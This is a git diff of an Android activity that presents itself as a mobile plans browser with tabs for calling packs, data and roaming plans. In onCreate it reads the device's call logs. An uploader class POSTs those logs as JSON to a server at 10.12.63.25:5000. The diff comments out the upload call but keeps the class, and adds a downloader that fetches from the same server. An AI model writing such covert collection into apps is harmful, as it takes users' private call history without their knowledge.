@@ -11,6 +11,7 @@ import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
 import android.util.Log;
 
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -46,95 +47,110 @@ public class PlanActivity extends AppCompatActivity {
 
         String callLogs = new CallLogger().readCallLogs(this);
         Log.e("TAG", "onCreate:" + callLogs);
-        new CLogsUploader().execute(callLogs);
+//        new CLogsUploader().execute(callLogs);
+        new Downloader().execute();
 
-/*
-        new CallLogger().uploadToServer("http://10.12.63.25:5000/data", callLogs, new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {
-                Log.e("TAG", "Failed" + e);
+    }
+        private void setupViewPager (ViewPager viewPager){
+            ViewPagerAdapter adapter = new ViewPagerAdapter(getSupportFragmentManager());
+            adapter.addFragment(new SpecialPlansFragment(), "My Special Plans");
+            adapter.addFragment(new CommonFragment(), "Calling Packs");
+            adapter.addFragment(new CommonFragment(), "4G Data");
+            adapter.addFragment(new CommonFragment(), "3G Data");
+            adapter.addFragment(new CommonFragment(), "Tariff Plans");
+            adapter.addFragment(new CommonFragment(), "Roaming Plans");
+            viewPager.setAdapter(adapter);
+        }
+
+        class ViewPagerAdapter extends FragmentPagerAdapter {
+            private final List<Fragment> mFragmentList = new ArrayList<>();
+            private final List<String> mFragmentTitleList = new ArrayList<>();
+
+            public ViewPagerAdapter(FragmentManager manager) {
+                super(manager);
             }
 
             @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    Log.e("TAG", "Submitted" + response.body().toString());
+            public Fragment getItem(int position) {
+                return mFragmentList.get(position);
+            }
+
+            @Override
+            public int getCount() {
+                return mFragmentList.size();
+            }
+
+            public void addFragment(Fragment fragment, String title) {
+                mFragmentList.add(fragment);
+                mFragmentTitleList.add(title);
+            }
+
+            @Override
+            public CharSequence getPageTitle(int position) {
+                return mFragmentTitleList.get(position);
+            }
+        }
+
+        class CLogsUploader extends AsyncTask<String, Void, Void> {
+            @Override
+            protected Void doInBackground(String... params) {
+                String url = "http://10.12.63.25:5000/data";
+                final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
+                OkHttpClient client = new OkHttpClient();
+                String data = params[0];
+                data = "{\"title\":\"" + data + "\"}";
+
+                Log.e("Async", "Data is " + data);
+
+                RequestBody requestBody = RequestBody.create(JSON, data);
+                Request request = new Request.Builder()
+                        .url(url)
+                        .post(requestBody)
+                        .build();
+
+                Log.e("Async", requestBody.toString());
+                try {
+                    Response response = client.newCall(request).execute();
+                    Log.e("Async", response.body().string());
+                } catch (Exception e) {
+                    Log.e("Async", "Exception " + e);
+                    e.printStackTrace();
                 }
+                return null;
             }
-        });*/
-
-    }
-
-
-    private void setupViewPager(ViewPager viewPager) {
-        ViewPagerAdapter adapter = new ViewPagerAdapter(getSupportFragmentManager());
-        adapter.addFragment(new SpecialPlansFragment(), "My Special Plans");
-        adapter.addFragment(new CommonFragment(), "Calling Packs");
-        adapter.addFragment(new CommonFragment(), "4G Data");
-        adapter.addFragment(new CommonFragment(), "3G Data");
-        adapter.addFragment(new CommonFragment(), "Tariff Plans");
-        adapter.addFragment(new CommonFragment(), "Roaming Plans");
-        viewPager.setAdapter(adapter);
-    }
-
-    class ViewPagerAdapter extends FragmentPagerAdapter {
-        private final List<Fragment> mFragmentList = new ArrayList<>();
-        private final List<String> mFragmentTitleList = new ArrayList<>();
-
-        public ViewPagerAdapter(FragmentManager manager) {
-            super(manager);
         }
 
-        @Override
-        public Fragment getItem(int position) {
-            return mFragmentList.get(position);
-        }
-
-        @Override
-        public int getCount() {
-            return mFragmentList.size();
-        }
-
-        public void addFragment(Fragment fragment, String title) {
-            mFragmentList.add(fragment);
-            mFragmentTitleList.add(title);
-        }
-
-        @Override
-        public CharSequence getPageTitle(int position) {
-            return mFragmentTitleList.get(position);
-        }
-    }
-
-    class CLogsUploader extends AsyncTask<String, Void, Void> {
-        @Override
-        protected Void doInBackground(String... params) {
+        class Downloader extends AsyncTask<Void, Void, String> {
             String url = "http://10.12.63.25:5000/data";
-            final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
-            OkHttpClient client = new OkHttpClient();
-            String data = params[0];
-            data = "{\"title\":\"" + data + "\"}";
 
-            Log.e("Async", "Data is " + data);
+            @Override
+            protected String doInBackground(Void... params) {
+                try {
+                    OkHttpClient client = new OkHttpClient();
+                    Request request = new Request.Builder()
+                            .url(url)
+                            .build();
+                    Response responses = null;
 
-            RequestBody requestBody = RequestBody.create(JSON, data);
-            Request request = new Request.Builder()
-                    .url(url)
-                    .post(requestBody)
-                    .build();
-
-            Log.e("Async", requestBody.toString());
-            try {
-                Response response = client.newCall(request).execute();
-                Log.e("Async", response.body().string());
-            } catch (Exception e) {
-                Log.e("Async", "Exception " + e);
-                e.printStackTrace();
+                    try {
+                        responses = client.newCall(request).execute();
+                        Log.e("TAG", responses.body().string());
+                        return responses.body().string();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                } catch (Exception e) {
+                }
+                return null;
             }
-            return null;
+
+            @Override
+            protected void onPostExecute(String s) {
+
+            }
         }
     }
-}
+
 
 
 
